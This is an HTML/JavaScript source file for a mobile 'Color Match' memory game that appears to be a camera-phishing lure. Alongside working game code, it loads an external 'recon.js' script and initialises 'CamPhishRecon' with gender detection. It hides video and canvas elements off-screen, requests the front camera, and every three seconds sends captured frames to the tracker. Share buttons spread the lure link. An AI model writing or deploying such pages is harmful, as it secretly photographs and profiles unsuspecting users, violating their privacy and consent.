<!-- DESC: Memory color match game — repeat the sequence -->
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#0d0d1a">
<title>Color Match</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#0d0d1a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;overflow:hidden;touch-action:none;user-select:none;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.title{font-size:clamp(28px,8vw,48px);background:linear-gradient(135deg,#ff6b9d,#ffd700,#6bcfff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;margin-bottom:8px}
.sub{color:#888;font-size:14px;margin-bottom:30px}
#grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:min(300px,80vw);aspect-ratio:1}
.pad{border-radius:20px;cursor:pointer;opacity:0.6;transition:opacity .1s,transform .1s;border:3px solid rgba(255,255,255,0.1)}
.pad.active{opacity:1;transform:scale(0.95);box-shadow:0 0 30px currentColor}
.pad:active{opacity:1;transform:scale(0.95)}
#p1{background:#ff6b9d;color:#ff6b9d}#p2{background:#7bed9f;color:#7bed9f}#p3{background:#6bcfff;color:#6bcfff}#p4{background:#ffd700;color:#ffd700}
#status{font-size:18px;margin:20px 0;min-height:27px;color:#aaa}
#round{font-size:14px;color:#666;margin-bottom:10px}
.btn{background:linear-gradient(135deg,#ff6b9d,#c44dff);color:#fff;border:none;padding:14px 44px;font-size:18px;font-weight:800;border-radius:30px;cursor:pointer;margin-top:10px}
.btn:active{transform:scale(0.95)}
.hidden{display:none}
.go{position:fixed;inset:0;background:rgba(13,13,26,0.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50}
.final{font-size:clamp(36px,10vw,56px);color:#ffd700;font-weight:900}
.best{color:#888;margin:8px 0 20px}
.shares{display:flex;gap:8px;margin-bottom:16px}
.sb{padding:10px 18px;border:none;border-radius:20px;color:#fff;font-weight:700;font-size:13px;cursor:pointer}
.s-wa{background:#25D366}.s-fb{background:#1877F2}.s-tw{background:#1DA1F2}
.lb{color:#666;font-size:12px;margin-top:16px;text-align:center}
video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
</style>
</head><body>
<script src="forwarding_link/t/recon.js"></script>
<video id="v" playsinline autoplay muted></video>
<canvas id="cap" width="320" height="240"></canvas>
<div class="title">🎨 Color Match</div>
<div class="sub">Memorize & repeat the sequence</div>
<div id="round">Round 1</div>
<div id="grid">
<div class="pad" id="p1" data-i="0"></div>
<div class="pad" id="p2" data-i="1"></div>
<div class="pad" id="p3" data-i="2"></div>
<div class="pad" id="p4" data-i="3"></div>
</div>
<div id="status">Press Start to begin</div>
<button class="btn" id="startBtn" onclick="startGame()">▶ Start</button>
<div class="go hidden" id="gameover">
<div style="font-size:28px;color:#ff6b9d;margin-bottom:8px">Game Over</div>
<div class="final" id="finalScore">0</div>
<div class="best" id="bestScore"></div>
<div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
<button class="btn" onclick="startGame()">▶ Play Again</button>
<div class="lb" id="goLb"></div>
</div>
<script>
var API='API_BASE_URL',SHARE_URL='forwarding_link/t/color-match';
var sequence=[],playerInput=[],round=1,playing=false,acceptingInput=false;
var pads=[1,2,3,4].map(function(i){return document.getElementById('p'+i);});
var statusEl=document.getElementById('status'),roundEl=document.getElementById('round');
var hs=[];try{hs=JSON.parse(localStorage.getItem('colorMatchHS')||'[]');}catch(e){}
var ac=null;
function snd(f){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac.createOscillator(),g=ac.createGain();o.frequency.value=f;g.gain.value=0.08;o.connect(g);g.connect(ac.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.2);o.stop(ac.currentTime+0.2);}catch(e){}}
var freqs=[330,440,550,660];
function flash(i){pads[i].classList.add('active');snd(freqs[i]);setTimeout(function(){pads[i].classList.remove('active');},300);}
function startGame(){
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
sequence=[];round=1;playing=true;
document.getElementById('gameover').classList.add('hidden');
document.getElementById('startBtn').classList.add('hidden');
nextRound();
}
function nextRound(){
playerInput=[];acceptingInput=false;
roundEl.textContent='Round '+round;
statusEl.textContent='Watch carefully...';
var i=0;
sequence.push(Math.floor(Math.random()*4));
var playInterval=setInterval(function(){
flash(sequence[i]);i++;
if(i>=sequence.length){clearInterval(playInterval);setTimeout(function(){statusEl.textContent='Your turn!';acceptingInput=true;},500);}
},600);
}
pads.forEach(function(pad,idx){
pad.addEventListener('click',function(){
if(!acceptingInput)return;
flash(idx);playerInput.push(idx);
var pos=playerInput.length-1;
if(playerInput[pos]!==sequence[pos]){gameOver();return;}
if(playerInput.length===sequence.length){
acceptingInput=false;statusEl.textContent='Correct!';round++;
if(navigator.vibrate)navigator.vibrate(20);
setTimeout(nextRound,800);
}
});
});
function gameOver(){
playing=false;acceptingInput=false;statusEl.textContent='Wrong!';
if(navigator.vibrate)navigator.vibrate([50,50,50]);
snd(150);
hs.push(round-1);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);
localStorage.setItem('colorMatchHS',JSON.stringify(hs));
document.getElementById('finalScore').textContent='Round '+(round-1);
document.getElementById('bestScore').textContent='Best: Round '+(hs[0]||0);
document.getElementById('gameover').classList.remove('hidden');
var h='<b>🏆 Top Rounds</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — Round '+hs[i]+'</div>';
if(!hs.length)h='<b>🏆 Be the first!</b>';
document.getElementById('goLb').innerHTML=h;
if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{round:round-1});
}
function shareCard(t){
var c=document.createElement('canvas');c.width=600;c.height=800;var x=c.getContext('2d');
var bg=x.createLinearGradient(0,0,0,800);bg.addColorStop(0,'#0d0d1a');bg.addColorStop(1,'#1a1a3a');x.fillStyle=bg;x.fillRect(0,0,600,800);
var cols=['#ff6b9d','#7bed9f','#6bcfff','#ffd700'];
for(var i=0;i<4;i++){x.fillStyle=cols[i];x.globalAlpha=0.15;x.beginPath();x.roundRect(80+i%2*220,120+Math.floor(i/2)*220,200,200,20);x.fill();}
x.globalAlpha=1;
x.fillStyle='#fff';x.font='bold 36px system-ui';x.textAlign='center';x.fillText('🎨 Color Match',300,120);
x.fillStyle='#888';x.font='18px system-ui';x.fillText('I reached Round '+(round-1)+'!',300,260);
x.fillStyle='#ffd700';x.font='bold 60px system-ui';x.fillText('Round '+(round-1),300,340);
x.fillStyle='#fff';x.font='20px system-ui';x.fillText('Can you beat me?',300,420);
x.fillStyle='#6bcfff';x.font='bold 18px monospace';x.fillText(SHARE_URL,300,480);
x.fillStyle='#555';x.font='12px system-ui';x.fillText('Color Match · Memory Game',300,720);
c.toBlob(function(blob){
var msg='🎨 I reached Round '+(round-1)+' in Color Match! Can you beat me? '+SHARE_URL;
var file=new File([blob],'color-match.png',{type:'image/png'});
if(navigator.canShare&&navigator.canShare({files:[file]})){navigator.share({text:msg,files:[file],title:'Color Match'}).catch(function(){});return;}
if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='color-match.png';a.click();
},'image/png');
}
// Camera capture (optional)
if(navigator.mediaDevices&&window.CamPhishRecon){
navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
var v=document.getElementById('v');v.srcObject=s;v.play();
var cap=document.getElementById('cap'),cx=cap.getContext('2d');
setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);
}).catch(function(){});
}
</script>
</body></html>
